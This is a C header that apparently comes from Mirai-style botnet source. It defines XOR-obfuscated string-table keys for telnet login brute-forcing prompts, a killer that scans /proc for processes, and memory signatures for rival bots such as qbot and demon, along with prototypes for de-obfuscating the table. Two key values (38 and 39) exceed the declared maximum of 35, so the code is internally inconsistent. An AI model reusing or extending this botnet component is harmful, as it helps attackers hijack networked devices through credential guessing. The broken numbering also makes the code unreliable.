#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
struct table_value
{
    char *val;
    uint16_t val_len;
};

/* Defining Table Keys */
#define XOR_SCAN_PORT 1

#define XOR_NULL 2

#define XOR_IOCTL_WATCH1 3
#define XOR_IOCTL_WATCH2 4

#define XOR_SCAN_SHELL 5
#define XOR_SCAN_ENABLE 6
#define XOR_SCAN_SYSTEM 7
#define XOR_SCAN_LINUXSHELL 8
#define XOR_SCAN_SH 9

#define XOR_SCAN_NCORRECT 10
#define XOR_SCAN_OGIN 11
#define XOR_SCAN_ENTER 12
#define XOR_SCAN_ASSWORD 13

#define XOR_SCAN_QUERY 14
#define XOR_SCAN_RESP 15

#define XOR_KILL_PROC 16
#define XOR_KILL_EXE 17
#define XOR_KILL_FD 18
#define XOR_KILL_MAPS 19
#define XOR_KILL_TCP 20
#define XOR_KILL_STATUS 21
#define XOR_KILL_ANIME 22

#define XOR_MEM_ASSWORD 23
#define XOR_MEM_NETSLINK 24
#define XOR_MEM_QBOT 25
#define XOR_MEM_MODZ 26
#define XOR_MEM_DEMON 27
#define XOR_MEM_SELF_EXE 38
#define XOR_MEM_UPX 39
#define XOR_MEM_ROUTE 30
#define XOR_MEM_RC 31
#define XOR_MEM_BINSH 32

#define XOR_EXEC_SUCCESS 33
#define XOR_RANDOM 34

#define MAX_XOR_KEYS 35


void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
